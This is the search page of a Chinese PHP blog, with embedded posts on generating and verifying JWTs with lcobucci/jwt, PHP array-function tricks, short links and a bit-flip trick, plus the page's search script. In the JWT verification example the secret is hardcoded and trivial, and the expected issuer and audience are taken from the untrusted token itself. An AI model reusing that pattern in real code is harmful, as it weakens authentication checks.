&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;参数说明&#34;&gt;参数说明&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;iss 【issuer】发布者的url地址&lt;/li&gt;
&lt;li&gt;aud 【audience】接受者的url地址&lt;/li&gt;
&lt;li&gt;sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段&lt;/li&gt;
&lt;li&gt;exp 【expiration】 该jwt销毁的时间；unix时间戳&lt;/li&gt;
&lt;li&gt;nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳&lt;/li&gt;
&lt;li&gt;iat 【issued at】 该jwt的发布时间；unix 时间戳&lt;/li&gt;
&lt;li&gt;jti 【JWT ID】该jwt的唯一ID编号&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;生成token&#34;&gt;生成token&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

require &#39;./vendor/autoload.php&#39;;

use Lcobucci\JWT\Builder;
use Lcobucci\JWT\Signer\Hmac\Sha256;
use Lcobucci\JWT\Signer\Key;

//发布端url
$iss = &#39;http://admin.jwt.com&#39;;
//请求端URL
$aud = &#39;http://api.jwt.com/user/login&#39;;
//唯一的jwt id
$jwt_id = &#39;jwt123&#39;;
//私钥，用于token验证
$signer_key = &#39;jwt-test&#39;;

$signer = new Sha256();

$token = (new Builder())-&amp;gt;issuedBy($iss)
                        -&amp;gt;permittedFor($aud)
                        -&amp;gt;identifiedBy($jwt_id, true)
                        -&amp;gt;issuedAt(time())
                        -&amp;gt;canOnlyBeUsedAfter(time() + 60)
                        -&amp;gt;expiresAt(time() + 3600)
                        -&amp;gt;set(&#39;user&#39;, [&#39;name&#39; =&amp;gt; &#39;police&#39;, &#39;mobile&#39; =&amp;gt; &#39;110&#39;])
                        -&amp;gt;withClaim(&#39;uid&#39;, 1)
                        -&amp;gt;getToken($signer, new Key($signer_key));
echo $token;

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;验证token&#34;&gt;验证token&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php
require &#39;./vendor/autoload.php&#39;;

use Lcobucci\JWT\ValidationData;
use Lcobucci\JWT\Parser;
use Lcobucci\JWT\Signer\Hmac\Sha256;

$token  = $_GET[&#39;token&#39;] ?? &#39;&#39;;
$token  = (new Parser())-&amp;gt;parse((string) $token);
$signer = new Sha256();

$aud    = $token-&amp;gt;getClaim(&#39;aud&#39;);
$iss    = $token-&amp;gt;getClaim(&#39;iss&#39;);
$jwt_id = $token-&amp;gt;getHeader(&#39;jti&#39;);
$user   = $token-&amp;gt;getClaim(&#39;user&#39;);


$signer_key = &#39;jwt-test&#39;;  //私钥

$data = new ValidationData();

$data-&amp;gt;setIssuer($iss);
$data-&amp;gt;setAudience($aud);
$data-&amp;gt;setId($jwt_id);

//验证私钥
var_dump($token-&amp;gt;verify($signer, $signer_key));

//失败，因为token在60秒后方可验证
var_dump($token-&amp;gt;validate($data));

//修改验证时间
$data-&amp;gt;setCurrentTime(time() + 60);

// true
var_dump($token-&amp;gt;validate($data));

$data-&amp;gt;setCurrentTime(time() + 4000);

//false,token过期
var_dump($token-&amp;gt;validate($data));

&lt;/code&gt;&lt;/pre&gt;
">轻松生成jwt的插件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/qiao-yong-php-shu-zu-han-shu/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;PHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;取指定键名&#34;&gt;取指定键名&lt;/h3&gt;
&lt;p&gt;对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 &lt;code&gt;[&#39;id&#39; =&amp;gt; 1, &#39;name&#39; =&amp;gt; &#39;zane&#39;, &#39;password&#39; =&amp;gt; &#39;123456&#39;]&lt;/code&gt; 此时若只想取包含 id 和 name&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$raw = [&#39;id&#39; =&amp;gt; 1, &#39;name&#39; =&amp;gt; &#39;zane&#39;, &#39;p
assword&#39; =&amp;gt; &#39;123456&#39;];
// 自己用 PHP 实现
function onlyKeys($raw, $keys) {
    $new = [];
    foreach ($raw as $key =&amp;gt; $val) {
        if (in_array($key, $keys)) {
            $new[$key] = $val;
        }
    }

    return $new;
}
// 用 PHP 内置函数实现
function newOnlyKeys($array, $keys) {
    return array_intersect_key($array, array_flip($keys));
}
var_dump(onlyKeys($raw, [&#39;id&#39;, &#39;name&#39;]));
// 结果 [&#39;id&#39; =&amp;gt; 1, &#39;name&#39; =&amp;gt; &#39;zane&#39;]
var_dump(newOnlyKeys($raw, [&#39;id&#39;, &#39;name&#39;]));
// 结果 [&#39;id&#39; =&amp;gt; 1, &#39;name&#39; =&amp;gt; &#39;zane&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;简单的介绍一下这两个函数的作用，首先是 &lt;code&gt;array_flip&lt;/code&gt; 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 &lt;code&gt;[0 =&amp;gt; &#39;id&#39;, 1 =&amp;gt; &#39;name&#39;]&lt;/code&gt; 转变为了 &lt;code&gt;[&#39;id&#39; =&amp;gt; 0, &#39;name&#39; =&amp;gt; 1]&lt;/code&gt;。这样做的目的是为了向 &lt;code&gt;array_intersect_key&lt;/code&gt; 函数服务，&lt;code&gt;array_intersect_key&lt;/code&gt; 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值&lt;/p&gt;
&lt;h3 id=&#34;移除指定键名&#34;&gt;移除指定键名&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$raw = [&#39;id&#39; =&amp;gt; 1, &#39;name&#39; =&amp;gt; &#39;zane&#39;, &#39;password&#39; =&amp;gt; &#39;123456&#39;];
// 用 PHP 内置函数实现
function removeKeys($array, $keys) {
    return array_diff_key($array, array_flip($keys));
}
// 移除 id 键
var_dump(removeKeys($raw, [&#39;id&#39;, &#39;password&#39;]));
// 结果 [&#39;name&#39; =&amp;gt; &#39;zane&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;和上一个例子相比本例只是将 &lt;code&gt;array_intersect_key&lt;/code&gt; 函数改为 &lt;code&gt;array_diff_key&lt;/code&gt;(刚好和 &lt;code&gt;array_intersect_key&lt;/code&gt; 的功能相反)&lt;/p&gt;
&lt;h3 id=&#34;数组去重&#34;&gt;数组去重&lt;/h3&gt;
&lt;p&gt;PHP 内置了 array_unique 函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$input = [&#39;you are&#39; =&amp;gt; 666, &#39;i am&#39; =&amp;gt; 233, &#39;he is&#39; =&amp;gt; 233, &#39;she is&#39; =&amp;gt; 666];
$result = array_unique($input);
var_dump($result);
// 结果 [&#39;you are&#39; =&amp;gt; 666, &#39;i am&#39; =&amp;gt; 233]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;续调用两次 &lt;code&gt;array_flip&lt;/code&gt; 函数是不是就相当于实现了 &lt;code&gt;array_unique&lt;/code&gt; 函数的功能？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$input = [&#39;you are&#39; =&amp;gt; 666, &#39;i am&#39; =&amp;gt; 233, &#39;he is&#39; =&amp;gt; 233, &#39;she is&#39; =&amp;gt; 666];
$result = array_flip(array_flip($input));
var_dump($result);
// 结果 [&#39;she is&#39; =&amp;gt; 666, &#39;he is&#39; =&amp;gt; 233]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;array_unique&lt;/code&gt; 保留第一个出现的键名，&lt;code&gt;array_flip&lt;/code&gt;保留最后一个出现的键名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略&lt;/p&gt;
&lt;p&gt;此外，若不需要保留键名可以直接这样使用 &lt;code&gt;array_values(array_flip($input))&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;重置索引&#34;&gt;重置索引&lt;/h3&gt;
&lt;p&gt;当想要对一个索引并不连续的数组进行重置时，比如数组：&lt;code&gt;[0 =&amp;gt; 233, 99 =&amp;gt; 666]&lt;/code&gt;，对于这种数组我们只需要调用 &lt;code&gt;array_values&lt;/code&gt; 函数即可实现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$input = [0 =&amp;gt; 233, 99 =&amp;gt; 666];
var_dump(array_values($input));
// 结果 [0 =&amp;gt; 233, 1 =&amp;gt; 66]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;需要注意的是 &lt;code&gt;array_values&lt;/code&gt; 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 &lt;code&gt;array_slice&lt;/code&gt; 函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$input = [&#39;hello&#39; =&amp;gt; &#39;world&#39;, 0 =&amp;gt; 233, 99 =&amp;gt; 666];
var_dump(array_slice($input, 0));
// 结果 [&#39;hello&#39; =&amp;gt; &#39;world&#39;, 0 =&amp;gt; 233, 1 =&amp;gt; 66]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;array_slice&lt;/code&gt; 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引&lt;/p&gt;
&lt;h3 id=&#34;清除空值&#34;&gt;清除空值&lt;/h3&gt;
&lt;p&gt;有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、&#39;&#39;空字符串、&#39;0&#39;字符串0 ，这时 &lt;code&gt;array_filter&lt;/code&gt; 函数便能帮上忙&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$input = [&#39;foo&#39;, false, -1, null, &#39;&#39;, []];
var_dump(array_filter($input));
// 结果 [0 =&amp;gt; &#39;foo&#39;, 2 =&amp;gt; -1]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;array_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; 如果不填写 callback 函数，0、0.0、&#39;0&#39;字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数&lt;/p&gt;
&lt;h3 id=&#34;确认数组成员全部为真&#34;&gt;确认数组成员全部为真&lt;/h3&gt;
&lt;p&gt;有时候我们希望确认数组中的的值全部为 true，比如：&lt;code&gt;[&#39;read&#39; =&amp;gt; true, &#39;write&#39; =&amp;gt; true, &#39;execute&#39; =&amp;gt; true]&lt;/code&gt;，只需要用 &lt;code&gt;array_product&lt;/code&gt; 函数便可以实现了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$power = [&#39;read&#39; =&amp;gt; true, &#39;write&#39; =&amp;gt; true, &#39;execute&#39; =&amp;gt; true];
var_dump((bool)array_product($power));
// 结果 true
$power = [&#39;read&#39; =&amp;gt; true, &#39;write&#39; =&amp;gt; true, &#39;execute&#39; =&amp;gt; false];
var_dump((bool)array_product($power));
// 结果 false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;array_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$power = [&#39;read&#39; =&amp;gt; true, &#39;write&#39; =&amp;gt; true, &#39;execute&#39; =&amp;gt; &#39;true&#39;];
var_dump((bool)array_product($power));
// 结果 false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为 &#39;true&#39; 在计算过程中被转为 0&lt;/p&gt;
&lt;h3 id=&#34;获取指定键名之前-之后的数组&#34;&gt;获取指定键名之前 / 之后的数组&lt;/h3&gt;
&lt;p&gt;如果只想要关联数组中指定键名值之前的部分可以通过 &lt;code&gt;array_keys&lt;/code&gt;、&lt;code&gt;array_search&lt;/code&gt; 和 &lt;code&gt;array_slice&lt;/code&gt; 组合使用便能够实现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$data = [&#39;first&#39; =&amp;gt; 1, &#39;second&#39; =&amp;gt; 2, &#39;third&#39; =&amp;gt; 3];
function beforeKey($array, $key) {
    $keys = array_keys($array);
  	// $keys = [0 =&amp;gt; &#39;first&#39;, 1 =&amp;gt; &#39;second&#39;, 2 =&amp;gt; &#39;third&#39;]
    $len = array_search($key, $keys);
    return array_slice($array, 0, $len);
}
var_dump(beforeKey($data, &#39;first&#39;));
// 结果 []
var_dump(beforeKey($data, &#39;second&#39;));
// 结果 [&#39;first&#39; =&amp;gt; 1]
var_dump(beforeKey($data, &#39;third&#39;));
// 结果 [&#39;first&#39; =&amp;gt; 1, &#39;second&#39; =&amp;gt; 2]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;array_slice&lt;/code&gt; 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」&lt;/p&gt;
&lt;p&gt;&lt;code&gt;array_keys&lt;/code&gt; 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：&lt;code&gt;[0 =&amp;gt; &#39;first&#39;, 1 =&amp;gt; &#39;second&#39;, 2 =&amp;gt; &#39;third&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后通过 &lt;code&gt;array_search&lt;/code&gt; 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」&lt;/p&gt;
&lt;p&gt;有了偏移量直接调用 &lt;code&gt;array_slice&lt;/code&gt; 函数便可以实现目的了&lt;/p&gt;
&lt;p&gt;那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$data = [&#39;first&#39; =&amp;gt; 1, &#39;second&#39; =&amp;gt; 2, &#39;third&#39; =&amp;gt; 3];
function afterKey($array, $key) {
    $keys = array_keys($array);
    $offset = array_search($key, $keys);
    return array_slice($array, $offset + 1);
}
var_dump(afterKey($data, &#39;first&#39;));
// 结果 [&#39;second&#39; =&amp;gt; 2, &#39;third&#39; =&amp;gt; 3]
var_dump(afterKey($data, &#39;second&#39;));
// 结果 [&#39;third&#39; =&amp;gt; 3]
var_dump(afterKey($data, &#39;third&#39;));
// 结果 []
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;获取指定值之前或之后的数组，只需调用 &lt;code&gt;beforeKey($data, array_search($value, $data))&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;数组中重复次数最多的值&#34;&gt;数组中重复次数最多的值&lt;/h3&gt;
&lt;p&gt;假设有这样一个数组 &lt;code&gt;[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]&lt;/code&gt;，如何获取数组中重复次数最多的值？关键在于 &lt;code&gt;array_count_values&lt;/code&gt; 函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$data = [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8];
$cv = array_count_values($data);
// $cv = [6 =&amp;gt; 2, 11 =&amp;gt; 4, 2 =&amp;gt; 2, 4 =&amp;gt; 3, 7 =&amp;gt; 1, 8 =&amp;gt; 1]
arsort($cv);
$max = key($cv);
var_dump($max);
// 结果 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;array_count_values&lt;/code&gt;函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值&lt;/p&gt;
&lt;p&gt;这样便可以通过 &lt;code&gt;arsort&lt;/code&gt; 函数对出现的次数进行降序排序并且保持索引关联&lt;/p&gt;
&lt;p&gt;最后使用 &lt;code&gt;key&lt;/code&gt; 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值&lt;/p&gt;
">巧用PHP数组函数</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/duan-lian-jie/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;github项目地址&#34;&gt;github项目地址&lt;/h3&gt;
&lt;p&gt;https://github.com/achais/shorturl&lt;/p&gt;
&lt;h3 id=&#34;新浪微博app-key&#34;&gt;新浪微博app key&lt;/h3&gt;
&lt;p&gt;https://fengmk2.com/blog/appkey.html&lt;/p&gt;
&lt;p&gt;基本实现需求&lt;/p&gt;
">短链接</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/0-1-hu-zhuan/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;按位非&#34;&gt;按位非&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;~value + 2;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;异或&#34;&gt;异或&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;1 ^ 1 = 0;
1 ^ 0 = 1;
&lt;/code&gt;&lt;/pre&gt;
">0 1 互转</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>



</html>